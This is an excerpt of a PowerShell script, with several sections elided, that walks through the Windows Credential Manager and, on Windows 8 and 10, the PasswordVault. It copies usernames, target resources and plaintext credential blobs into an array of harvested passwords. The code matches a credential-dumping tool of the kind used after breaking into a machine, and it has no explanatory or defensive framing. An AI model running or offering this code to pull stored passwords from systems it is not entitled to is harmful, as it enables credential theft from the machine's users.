...
foreach($Cred in $Creds)
        ...
        $tempcredobj=""|Select Username, Password, Target, Updated, Comment, Alias, AttribCount, Attributes, Flags, PWDSize, Storage, Type
        $tempcredobj.Username=$Cred.TargetAlias
        $tempcredobj.Password=$Cred.CredentialBlob
        $tempcredobj.Target=($Cred.TargetName.Substring($Cred.TargetName.IndexOf("=")+1))
        $tempcredobj.Updated=([String]::Format("{0:yyyy-MM-dd HH:mm:ss}", $Cred.LastWritten.ToUniversalTime())) 
        $tempcredobj.Comment=$Cred.Comment
        $tempcredobj.Alias=$Cred.TargetAlias
        $tempcredobj.AttribCount=$Cred.AttributeCount
        $tempcredobj.Attributes=$Cred.Attributes
        $tempcredobj.Flags=$Cred.Flags
        $tempcredobj.PWDSize=$Cred.CredentialBlobSize
        $tempcredobj.Storage=$Cred.Persist
...
If ($OSVersion -like "8.*" -or $OSVersion -like "10.*"){
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]  
    $vault = New-Object Windows.Security.Credentials.PasswordVault 
    $WebPasswords=@()
    Foreach ($VaultRecord in $vault.RetrieveAll()){
...
Foreach ($pass in $CredStorePasswords){
    $tempobj=""|select Username, Resource, Password
    $tempobj.Username=$pass.Username
    $tempobj.Resource=$pass.TargetName
    $tempobj.Password=$pass.CredentialBlob
    If ($tempobj.Password.length -ne 0){$AllPasswords+=$tempobj}
    }
